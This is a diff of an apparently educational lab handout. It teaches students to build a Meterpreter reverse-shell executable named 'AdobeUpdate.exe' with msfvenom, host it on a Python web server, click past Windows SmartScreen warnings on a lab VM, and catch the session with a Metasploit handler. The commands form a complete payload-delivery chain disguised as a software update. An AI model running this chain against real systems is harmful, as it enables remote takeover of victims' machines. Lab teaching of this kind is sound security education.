@@ -24,41 +24,47 @@ In this section, you’ll use msfvenom to perform a client-side attack. Msfvenom
 4.	In Kali, type `msfvenom --help-formats` to see a list of output formats that msfvenom supports. We’ll use the `-f exe` option to create a Windows executable.
 5.	In Kali, run the following command, all on one line:
 
-        msfvenom -p windows/shell/reverse_tcp LHOST=[your Kali IP] -f exe > /tmp/AdobeUpdate.exe
+        msfvenom -p windows/meterpreter/reverse_tcp LHOST=[your Kali IP] -f exe > /tmp/AdobeUpdate.exe
 
     Where:
 
     * `-p`		Selects the payload
     * `-f`		Selects the file type of the output executable
     * `LHOST`   The IP of your Kali Linux VM
-    * `LPORT` 	The listening port on your Kali Linux VM
 
 6.	Verify that the output file is about 73802 bytes in size. If not, you may need to check that you entered the command correctly and run it again.
 10.	Run a msf handler to listen for the meterpreter reverse connection.
-    11. On Kali, open a new terminal window (besides the one that is running the Python webserver), and enter `msfconsole`.
+    11. On Kali, open a new terminal window and enter `msfconsole`.
     11.	Enter `use exploit/multi/handler`. Once you’ve switched to this exploit module, type `show info`. Note that this module “is a stub that provides all of the features of the Metasploit payload system to exploits that have been launched outside of the framework.” A stub adds additional functionality to other exploits.
-    12.	Enter `set PAYLOAD windows/shell/reverse_tcp`.
+    12.	Enter `set PAYLOAD windows/meterpreter/reverse_tcp`.
     13.	Enter `set LHOST [IP of Kali VM]`.
     15.	Enter `exploit -j`. 
     
         <div class='alert alert-info' markdown='1'>
-            The `-j` option jobifies the exploit, or runs it as a job in the background. You can see a list of jobs running in the background by using the command jobs.
+        The `-j` option jobifies the exploit, or runs it as a job in the background. You can see a list of jobs running in the background by using the command jobs.
+        </div>    
+        
+        <div class='alert alert-info' markdown='1'>
+        Because <code>ExitOnSession</code> is set to <code>True</code> (the default for `exploit/multi/handler`; verify with `show advanced` from msfconsole), your handler will die after it gets one connection.
         </div>
     
-7.	Now, set up a web server to host your malicious file. Change directories to `/tmp` by entering `cd /tmp` in a kali terminal.
+7.	Now, set up a web server to host your malicious file. 
+    8.  Change directories to `/tmp` by entering `cd /tmp` in a kali terminal.
     8.	See that the payload you generated earlier is in this directory: `ls`
     9.  Now, from that directory, run this command:
 
             python -m SimpleHTTPServer 8888
+            
+        This will start a web server on your kali instance, serving content from the current directory (`/tmp`).
         
     9.	On your Windows 10 VM, browse to: 
 
             http://[IP of your Kali VM]:8888/
 
-        Verify that you can view the contents of /tmp on your Kali VM.
+        Verify that you can view the contents of `/tmp` on your Kali VM.
 
     
-16.	On your Windows 10 VM, in a web browser, download the `AdobeUpdate.exe` file from the Python webserver and run the executable. 
+16.	On your Windows 10 VM, in a web browser, download the malicious `AdobeUpdate.exe` file from the Python webserver and run the executable. 
     * If you use Edge/IE browser, download it, click "view downloads", right-click AdobeUpdate.exe, select "Run anyway"
     * If a warning appears saying that Windows couldn’t access Windows SmartScreen, "more info", then click “Run anyway.” 
     * For the warning, “Do you want to allow this app from an unknown publisher…,” click “Yes.”
@@ -67,10 +73,12 @@ In this section, you’ll use msfvenom to perform a client-side attack. Msfvenom
 
         sessions -i [the number of the new session]
 
-    This should open a shell on the Windows VM.
+    This should open a connection to a meterpreter on the Windows VM.
     
-18.	Type `whoami` to see the privileges that you are running under. Note that these are the privileges of the user of your Windows 10 VM.
-19.	Run the command `netstat -n` to see a listing of open connections on the Windows server. Note the “ESTABLISHED” connection from the Windows VM to your Kali VM.
+17. Run `shell` to drop down into a windows cmd prompt
+    18.	Type `whoami` to see the privileges that you are running under. Note that these are the privileges of the user of your Windows 10 VM.
+    19.	Run the command `netstat -n` to see a listing of open connections on the Windows server. Note the “ESTABLISHED” connection from the Windows VM to your Kali VM.
+    20. Return to your meterpreter shell (`exit`, I think).
 20. Carry out your nefarious purposes with the victim <i class='fa fa-birthday-cake'></i>
 
 
